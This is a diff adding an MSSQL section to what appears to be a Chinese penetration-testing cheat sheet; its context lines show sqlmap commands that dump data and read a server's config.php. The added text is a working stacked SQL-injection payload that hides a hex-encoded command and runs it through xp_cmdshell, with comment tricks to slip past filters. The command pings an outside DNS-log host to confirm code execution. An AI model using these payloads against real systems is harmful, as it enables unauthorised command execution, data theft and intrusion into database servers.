@@ -618,6 +618,15 @@ python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql -D test -T 
 python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as\config.php"
 ```
 
+## sql注入
+
+### mssql 
+堆叠注入，xpcmdshell
+```
+http://www.vuln.cn/post.php?id=11;DECLARE/**/@ljbd/**/VARCHAR(8000);SET/**/@ljbd=0x70696e67202d6e6320312077772e36373332396163312e646e732e313433332e65752e6f7267;EXEC/**/master..xp_cmdshell/**/@ljbd--
+```
+
+
 ## 找可写目录
 ```
 
